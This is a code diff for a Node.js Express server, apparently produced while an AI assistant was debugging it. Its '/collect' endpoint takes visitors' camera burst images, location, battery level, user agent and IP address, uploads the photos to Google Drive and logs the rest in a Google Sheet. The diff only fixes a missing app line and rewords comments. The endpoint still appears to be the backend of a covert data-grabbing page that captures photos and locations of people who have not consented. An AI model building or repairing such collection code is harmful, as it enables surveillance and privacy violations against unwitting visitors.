@@ -6,7 +6,10 @@ import { fileURLToPath } from 'url';
 import { Readable } from 'stream';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
-const app = express(); // This line was missing and caused the error
+
+// 1. THIS IS THE CRITICAL LINE THAT WAS MISSING
+const app = express(); 
+
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static(__dirname));
 
@@ -31,6 +34,7 @@ app.post('/collect', async (req, res) => {
     const { ts, hints, battery, location, burstImages } = req.body;
     const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
 
+    // Process the image for Google Drive
     const imgBase64 = burstImages[0].split(',')[1];
     const buffer = Buffer.from(imgBase64, 'base64');
     
@@ -43,11 +47,12 @@ app.post('/collect', async (req, res) => {
         mimeType: 'image/jpeg',
         body: Readable.from(buffer)
       },
-      // This fix solves the "Storage Quota" error from your logs
+      // Fixes the "Storage Quota" error from earlier logs
       supportsAllDrives: true, 
       fields: 'id, webViewLink'
     });
 
+    // Save data to your Google Sheet
     const row = [
       ts, ip, hints?.ua || 'N/A', 
       (battery?.levelPercent || 0) + '%', 
@@ -62,10 +67,10 @@ app.post('/collect', async (req, res) => {
       requestBody: { values: [row] }
     });
 
-    console.log("✅ Successfully saved to Drive and Sheet");
+    console.log("✅ Data and Photo link saved successfully!");
     res.json({ ok: true });
   } catch (err) {
-    console.error("❌ ERROR:", err.message);
+    console.error("❌ BACKEND ERROR:", err.message);
     res.status(500).json({ error: err.message });
   }
 });
